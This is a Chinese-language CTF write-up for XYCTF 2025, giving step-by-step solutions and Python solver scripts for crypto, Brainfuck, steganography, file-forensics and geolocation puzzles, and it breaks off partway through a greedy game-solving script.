<p>flag值：XYCTF{64341c34-1e13-47d5-b97c-bc17f7b7fe98}</p>
<h4 id="crypto-reed">crypto-reed</h4>
<p>1.看题目。大概就是用户提供一个种子，使用该种子初始化PRNG生成两个参数a和b，然后使用线性同余加密方式加密flag，(a
* table.index(m) + b) % 19198111。</p>
<p>2.nc上之后可以看到，虽然每次得到的密文组不同，但是固定的几个位置上的数一定是相同的，比如1，2，5...。说明这几个位置上的明文是相同的，如果可以先猜测这些位置上的明文，就可以列方程组解a,b，由此再去解剩余的密文。（说实话是遍历试的明文，代码总是有点问题改了很久，答案出来之后只能说哎，这怎么能没看出来，这相同的位置，这提示，哎）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406232133685.png"
                      alt="image-20250406232133685" style="zoom:50%;" 
                ></p>
<p>3.随便选一组数据来解：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse</span>(<span class="params">a, m</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gcd, x, y = extended_gcd(b % a, a)</span><br><span class="line">            <span class="keyword">return</span> gcd, y - (b // a) * x, x</span><br><span class="line"></span><br><span class="line">    gcd, x, _ = extended_gcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> gcd != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;a在模m下没有逆&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">cipher, table, m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解密cipher&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 找到重复值</span></span><br><span class="line">    repeated = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">set</span>(cipher) <span class="keyword">if</span> cipher.count(c) &gt; <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(repeated) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not enough repeated values to solve&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历可能的重复值组合</span></span><br><span class="line">    <span class="keyword">for</span> c0, c1 <span class="keyword">in</span> combinations(repeated, <span class="number">2</span>):</span><br><span class="line">        pos0 = cipher.index(c0)</span><br><span class="line">        pos1 = cipher.index(c1)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历可能的字符组合</span></span><br><span class="line">        <span class="keyword">for</span> m0 <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> m1 <span class="keyword">in</span> table:</span><br><span class="line">                i0 = table.index(m0)</span><br><span class="line">                i1 = table.index(m1)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    a = (c1 - c0) * inverse(i1 - i0, m) % m</span><br><span class="line">                    b = (c0 - a * i0) % m</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 检查a范围</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1145140</span> &lt;= a &lt;= <span class="number">19198100</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 解密全部</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    inv_a = inverse(a, m)</span><br><span class="line">                    flag = []</span><br><span class="line">                    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">                        idx = ((c - b) * inv_a) % m</span><br><span class="line">                        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="built_in">len</span>(table):</span><br><span class="line">                            <span class="keyword">raise</span> ValueError</span><br><span class="line">                        flag.append(table[idx])</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Possible flag:&quot;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to decrypt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">m = <span class="number">19198111</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试数据</span></span><br><span class="line">cipher = [<span class="number">3554294</span>, <span class="number">3554294</span>, <span class="number">4160781</span>, <span class="number">17161684</span>, <span class="number">3554294</span>, <span class="number">4160781</span>, <span class="number">13048613</span>, <span class="number">13655100</span>, <span class="number">16687535</span>, <span class="number">47710</span>, <span class="number">6244918</span>, <span class="number">8670866</span>, <span class="number">14868074</span>, <span class="number">13655100</span>, <span class="number">1867171</span>, <span class="number">3080145</span>, <span class="number">13655100</span>, <span class="number">9277353</span>, <span class="number">9277353</span>, <span class="number">14868074</span>, <span class="number">6244918</span>, <span class="number">5638431</span>, <span class="number">1867171</span>, <span class="number">6851405</span>, <span class="number">47710</span>, <span class="number">15474561</span>, <span class="number">14868074</span>, <span class="number">16081048</span>, <span class="number">9277353</span>, <span class="number">3554294</span>, <span class="number">11570963</span>, <span class="number">3554294</span>, <span class="number">11570963</span>, <span class="number">17768171</span>, <span class="number">3554294</span>, <span class="number">9751502</span>]</span><br><span class="line">solve(cipher, table, m)</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406224335690.png"
                      alt="image-20250406224335690" style="zoom:50%;" 
                ></p>
<p>flag值:XYCTF{114514fixedpointissodangerous1919810}</p>
<h4 id="misc-问卷">misc-问卷</h4>
<p>填写问卷得flag。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250407132018172.png"
                      class=""
                >
<p>flag{TH@NK_U!WE_H0P3_Y0U_H@VE_FU7!H@PPY_H<span class="citation"
data-cites="CKING">@CKING</span>!}</p>
<h4 id="misc-xgctf">misc-XGCTF</h4>
<p>1.审题，先去 CTFshow 找一下西瓜杯这场比赛</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406213220996-1743954120807-90.png"
                      alt="image-20250406213220996" style="zoom: 50%;" 
                ></p>
<p>2.根据题目 "唯一由 LamentXU 出的题", 点进每道题看看，找到这道题是
easy_polluted</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406213409260-1743954120807-91.png"
                      alt="image-20250406213409260" style="zoom:50%;" 
                ></p>
<p>3.为了方便找对应的原题，看看官方 wp，没想到直接给了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406213551415-1743954120807-92.png"
                      alt="image-20250406213551415" style="zoom:50%;" 
                ></p>
<p>4.直接搜 CISCN 华东南 WEB 没怎么找到，搜 dragonkeep
什么的也没找到，于是换成搜出题想找到出题人的博客，说不定有更详细的信息。也是很容易就找到了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406213723500-1743954120807-93.png"
                      alt="image-20250406213723500" style="zoom:50%;" 
                ></p>
<p>5.进入博客页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406213855060-1743954120807-94.png"
                      alt="image-20250406213855060" style="zoom:50%;" 
                ></p>
<p>6.下翻，左侧可拉开，有搜索功能</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214059696-1743954120807-95.png"
                      alt="image-20250406214059696" style="zoom: 50%;" 
                ></p>
<p>7.损友的话有可能会提到对方的，于是在这里搜索
dragonkeep，确实提到了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214143202-1743954120807-96.png"
                      alt="image-20250406214143202" style="zoom:50%;" 
                ></p>
<p>8.好好好直接给了对方的博客地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214224910-1743954120807-97.png"
                      alt="image-20250406214224910" style="zoom:50%;" 
                ></p>
<p>9.访问该地址，找到历史文章 CISCN 的 WEB，翻下源码搜 flag 就看见了，再
base64 解密即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214613601-1743954120807-98.png"
                      style="zoom:50%;" 
                ></p>
<p><img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214459712-1743953865918-1743954120807-99.png"
                      
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214519061-1743954120807-100.png"
                      alt="image-20250406214519061" style="zoom:50%;" 
                ></p>
<p>flag 值：flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e<span
class="citation" data-cites="se_fOrg1ve_Me">@se_fOrg1ve_Me</span>}</p>
<h4 id="misc-签个到吧">misc-签个到吧</h4>
<p>1.看一眼附件，挺眼熟的，根据题目内容搜一下，Brainfuck 啊</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406215452620-1743953974505-76.png"
                      alt="image-20250406215452620" style="zoom:50%;" 
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406215430650-1743953974505-77.png"
                      alt="image-20250406215430650" style="zoom:50%;" 
                ></p>
<p>2.直接尝试用网站一键解密！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406215621978-1743953974505-78.png"
                      alt="image-20250406215621978" style="zoom:50%;" 
                ></p>
<p>3.结果一片空白，短一点也是空白。好吧，只能老老实实学一下这个语言规则，稍微了解一下就好</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406215952102-1743953974505-79.png"
                      alt="image-20250406215952102" style="zoom:50%;" 
                ></p>
<p>4.这时候大概能发现这个-+-+-+纯没用，可删，但这应该影响不了最后的结果才对。再用调试工具试一下看是哪出了问题
https://ashupk.github.io/Brainfuck/brainfuck-visualizer-master/index.html</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406220311579-1743953974505-80.png"
                      alt="image-20250406220311579" style="zoom:50%;" 
                ></p>
<p>5.发现 []
的乘法做完之后本来都已经到右边的指针又返回来把往左一个的这个数清零。也就是
&lt; [-]
这部分的问题，全局选一下删掉，再运行就能发现每个位置的数都保存好了，按照
ascii 码也大概知道对了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406220726360-1743953974506-81.png"
                      alt="image-20250406220726360" style="zoom:50%;" 
                ></p>
<p>6.但是这个运行太慢，就写脚本了</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">brainfuck_interpreter</span>(<span class="params">code</span>):</span><br><span class="line">    tape = [<span class="number">0</span>] * <span class="number">30000</span></span><br><span class="line">    ptr = <span class="number">0</span></span><br><span class="line">    pc = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    bracket_map = &#123;&#125;</span><br><span class="line">    stack = []</span><br><span class="line">    <span class="keyword">for</span> pos, cmd <span class="keyword">in</span> <span class="built_in">enumerate</span>(code):</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">            stack.append(pos)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> stack:</span><br><span class="line">                start = stack.pop()</span><br><span class="line">                bracket_map[start] = pos</span><br><span class="line">                bracket_map[pos] = start</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> pc &lt; <span class="built_in">len</span>(code):</span><br><span class="line">        cmd = code[pc]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">            ptr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">            ptr -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            tape[ptr] = (tape[ptr] + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            tape[ptr] = (tape[ptr] - <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;[&#x27;</span> <span class="keyword">and</span> tape[ptr] == <span class="number">0</span>:</span><br><span class="line">            pc = bracket_map[pc]</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;]&#x27;</span> <span class="keyword">and</span> tape[ptr] != <span class="number">0</span>:</span><br><span class="line">            pc = bracket_map[pc]</span><br><span class="line"></span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    message = []</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> tape:</span><br><span class="line">        <span class="keyword">if</span> cell == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        message.append(<span class="built_in">chr</span>(cell))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(message)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&gt;+++++++++++++++++[&lt;++++++&gt;-]&gt;++++++++++++[&lt;+++++++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;-]&gt;+++++++++++++++++++++++++++++[&lt;+++&gt;-]&gt;+++++++++++++++++[&lt;+++&gt;-]&gt;++++++++++++[&lt;+++++++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;++++++++[&lt;++++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++[&lt;+++++&gt;-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-]&gt;++++++++[&lt;++++++&gt;-]&gt;+++++++++++++++++++[&lt;+++++&gt;-]&gt;+++++++++++[&lt;++++++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;++++++++++++[&lt;+++++++&gt;-]&gt;++++++++++[&lt;+++++++&gt;-]&gt;+++++++++++++++++++[&lt;+++++&gt;-]&gt;++++++++++[&lt;+++++&gt;-]&gt;++++++++[&lt;++++++&gt;-]&gt;++++++++++[&lt;+++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-]&gt;+++++++++++++++++++[&lt;+++++&gt;-]&gt;+++++++++++++++++++++++[&lt;+++&gt;-]&gt;+++++++++++[&lt;++++++++++&gt;-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;-]&gt;++++++++[&lt;++++++&gt;-]&gt;+++++++++++[&lt;+++++&gt;-]&gt;+++++++++++++++++++[&lt;+++++&gt;-]&gt;+++++++[&lt;+++++++&gt;-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-]&gt;+++++++++++[&lt;+++&gt;-]&gt;+++++++++++++++++++++++++[&lt;+++++&gt;-]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">clean_code = <span class="string">&#x27;&#x27;</span>.join(c <span class="keyword">for</span> c <span class="keyword">in</span> code <span class="keyword">if</span> c <span class="keyword">in</span> [<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run the interpreter and get the message</span></span><br><span class="line">message = brainfuck_interpreter(clean_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded Message:&quot;</span>, message)</span><br></pre></td></tr></table></figure></div>
<p>7.得到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406220901136-1743953974506-82.png"
                      alt="image-20250406220901136" style="zoom:50%;" 
                ></p>
<p>flag 值：flag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}</p>
<h4 id="misc-mader也要当ctfer">misc-MADer也要当CTFer</h4>
<p>是个mkv文件，打开只有十几秒的视频，但是下面时长5小时，肯定有问题</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406233620326.png"
                      class=""
                >
<p>然后看到后缀是mkv，搜一下这个mkv能封装视频、音频、字幕文件，下个小工具箱导出文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-211623.png"
                      class=""
                >
<p>有个字幕.ass文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-211633.png"
                      class=""
                >
<p>后面的text字段是标准的16进制，写个脚本提取</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;只是刚好情窦初开遇到你.ass&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line"></span><br><span class="line">dialogue_lines = [line <span class="keyword">for</span> line <span class="keyword">in</span> lines <span class="keyword">if</span> line.startswith(<span class="string">&quot;Dialogue:&quot;</span>)]</span><br><span class="line"></span><br><span class="line">texts = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> dialogue_lines:</span><br><span class="line">    parts = line.strip().split(<span class="string">&quot;,&quot;</span>, <span class="number">9</span>)  <span class="comment"># ASS 字幕 text 是第10个字段（索引9）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">10</span>:</span><br><span class="line">        texts.append(parts[<span class="number">9</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存为 txt</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;subtitle_texts.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    <span class="keyword">for</span> text <span class="keyword">in</span> texts:</span><br><span class="line">        out.write(text + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;提取完成，共 <span class="subst">&#123;<span class="built_in">len</span>(texts)&#125;</span> 行字幕文本。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>提取出来直接导入16进制文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-211742.png"
                      class=""
                >
<p>文件头是rifx，搜了一下是个ae的文件，是.aep，但是我的ae打不开。。。。就直接在线预览，搜了一下flag</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212051.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212100.png"
                      class=""
                >
<p>只有这俩，但是说明flag肯定在，找找又发现</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212153.png"
                      class=""
                >
<p>发现他们都在这个左边，我就直接慢慢看左边，没看到，最后我用记事本按这个方法找到了，不知道为什么在线预览没有，在记事本里他们前面的字符都一样我就这样找到的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212838.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212850.png"
                      class=""
                >
<p>得到flag<code>flag&#123;l_re@IIy_w@nn@_2_Ie@rn_AE&#125;</code></p>
<h4 id="misc-会飞的雷克萨斯">misc-会飞的雷克萨斯</h4>
<p>看到这个题目就知道答案了，大名鼎鼎的四川小孩，嘻嘻，但是我刚开始以为是找左边三位小数md5加密（我没加群！！！！！！）。下次flag形式发题目描述里吧，求求你。</p>
<p>现在dy搜一下这件事，是四川省内江市资中县的事情<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-220144.png"
                      class=""
                ></p>
<p>地图直接搜<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-220308.png"
                      class=""
                ></p>
<p>得到flag<code>flag&#123;四川省内江市资中县春岚北路城市中心内&#125;</code></p>
<h4 id="misc-曼波曼波曼波">misc-曼波曼波曼波</h4>
<p>qr码是假的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213510.png"
                      class=""
                >
<p>有一个smn.txt，看起来就像是要base64转图片（赛马娘），但是=在前面说明应该是需要逆序，直接在线逆序！！！！</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213557.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213852.png"
                      class=""
                >
<p>然后b64转图片</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213948.png"
                      class=""
                >
<p>得到图片</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213953.png"
                      class=""
                >
<p>然后就是正常的隐写，foremost/binwalk分离</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-214337.png"
                      class=""
                >
<p>里面是个zip，解压一张老隐写图和一段提示解压zip，密码<code>XYCTF2025</code></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-214419.png"
                      class=""
                >
<p>俩看起来一样的图，直接blindwatermark分离！！！！！</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-215124.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-215158.png"
                      class=""
                >
<p>得到flag<code>XYCTF&#123;easy_yin_xie_dfbfuj877&#125;</code></p>
<h4 id="misc-greedymen">misc-Greedymen</h4>
<p>这个写个脚本直接出</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_factors</span>(<span class="params">n</span>):</span><br><span class="line">    factors = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">int</span>(math.sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            factors.add(i)</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">1</span> <span class="keyword">and</span> i != n // i:</span><br><span class="line">                factors.add(n // i)</span><br><span class="line">    factors.discard(n)</span><br><span class="line">    <span class="keyword">return</span> factors</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simulate_game</span>(<span class="params">level_max, counter</span>):</span><br><span class="line">    board = &#123;i: <span class="string">&#x27;unassigned&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, level_max + <span class="number">1</span>)&#125;</span><br><span class="line">    my_score = <span class="number">0</span></span><br><span class="line">    opponent_score = <span class="number">0</span></span><br><span class="line">    steps = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> counter &gt; <span class="number">0</span>:</span><br><span class="line">        best_choice = <span class="literal">None</span></span><br><span class="line">        best_net_gain = <span class="built_in">float</span>(<span class="string">&#x27;-inf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, level_max + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> board[num] != <span class="string">&#x27;unassigned&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            factors = get_factors(num)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(board[f] != <span class="string">&#x27;unassigned&#x27;</span> <span class="keyword">for</span> f <span class="keyword">in</span> factors):</span><br><span class="line">                <span class="keyword">continue</span>  <span class="comment"># can&#x27;t pick this number, all factors already chosen</span></span><br><span class="line"></span><br><span class="line">            gain = num</span><br><span class="line">            cost = <span class="built_in">sum</span>(f <span class="keyword">for</span> f <span class="keyword">in</span> factors <span class="keyword">if</span> board[f] == <span class="string">&#x27;unassigned&#x27;</span>)</span><br><span class="line">            net_gain = gain - cost</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> net_gain &gt; best_net_gain:</span><br><span class="line">                best_net_gain = net_gain</span><br><span class="line">                best_choice = num</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> best_choice <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># no more valid moves</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Assign number to self</span></span><br><span class="line">        board[best_choice] = <span class="string">&#x27;me&#x27;</span></span><br><span class="line">        my_score += best_choice</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Assign its unassigned factors to opponent</span></span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> get_factors(best_choice):</span><br><span class="line">            <span class="keyword">if</span> board[f] == <span class="string">&#x27;unassigned&#x27;</span>:</span><br><span class="line">                board[f] = <span class="string">&#x27;opponent&#x27;</span></span><br><span class="line">                opponent_score += f</span><br><span 